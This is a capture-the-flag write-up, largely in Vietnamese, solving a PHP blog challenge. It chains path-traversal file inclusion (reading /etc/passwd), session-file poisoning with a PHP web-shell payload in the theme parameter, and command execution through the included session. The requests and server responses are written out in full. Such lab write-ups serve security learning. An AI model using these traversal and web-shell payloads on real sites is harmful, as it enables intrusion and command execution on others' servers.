**Description**

```
This guy wrote his own blog in PHP instead of, I dunno, literally anything else. Can you teach him a lesson?

The server is running php 7.4.26. If you're running locally, use Docker php@sha256:920a88344203adf78471ca898773f0e0ac171fb4a3be4ba2d4f9585163aaf038

source.zip

Note: You won't be able to read the flag directly. If the flag appears to be empty, try a different strategy. 
```

[file]()

Vulnerability identification LFI

Sau vài lần thử và mình thấy đường dẫn tệp có thể được kiểm soát bởi người dùng, kiểm tra LFI bằng cách cố gắng fetch /etc/passwd và lặp lại nó trong phản hồi http

```
GET /post.php?post=../../../../etc/passwd HTTP/1.1
Host: host.cg21.metaproblems.com:4130
```

```
HTTP/1.1 200 OK
...
<div class="post">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
flag:x:999:999::/home/flag:/usr/sbin/nologin
</div>
```

=> LFI triggered.

**PHP session poisoning**

Kiểm tra cookie và nhận được `PHPSESSID`.  Từ [https://github.com/w181496/Web-CTF-Cheatsheet#php-session ](https://github.com/w181496/Web-CTF-Cheatsheet#php-session). Để kích hoạt php poisoning, mình cần tìm nơi file session tồn tại. Sau một vài tìm kiếm, mình nhận thấy session của mỗi người dùng được lưu trữ tại `/tmp/sess_<PHPSESSID>` . 

```
GET /post.php?post=../../../../tmp/sess_kdlbh9k9knfm8n7jgdki0ho64h HTTP/1.1
```

```
HTTP/1.1 200 OK
...

<h1>
../../../../tmp/sess_kdlbh9k9knfm8n7jgdki0ho64h
</h1><hr>
<div class="post">theme|s:5:"light";
</div>    
<a href="/">home</a>
```

Đọc qua mã nguồn, từ truy vấn đến theme chúng ta có thể control và thực hiện shellcode`/set.php?theme=<php_rce_code>`  . Đặt thành `/set.php?theme=<?php echo shell_exec($_GET['cmd']); ?>`. 



**RCE**

Đặt tham số GET `cmd` có được RCE. Truy cập session file để thực thi command. Việc còn lại là đoán xem file chứa flag ở đâu thôi. 

```
GET /post.php?post=../../../../tmp/sess_h8iui7plbum2qbu76iei3fa75q&cmd=ls+../../../../ HTTP/1.1
```

Response

```
HTTP/1.1 200 OK
...

h1>
../../../../tmp/sess_h8iui7plbum2qbu76iei3fa75q
</h1><hr><div class="post">
theme|s:38:"bin
boot
dev
etc
flag
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
";
</div>
```

Khỉ thật, tại thời điểm mình thực hiện write-up thì k biết ông nào xóa mất file chứa flag rồi =)))) 
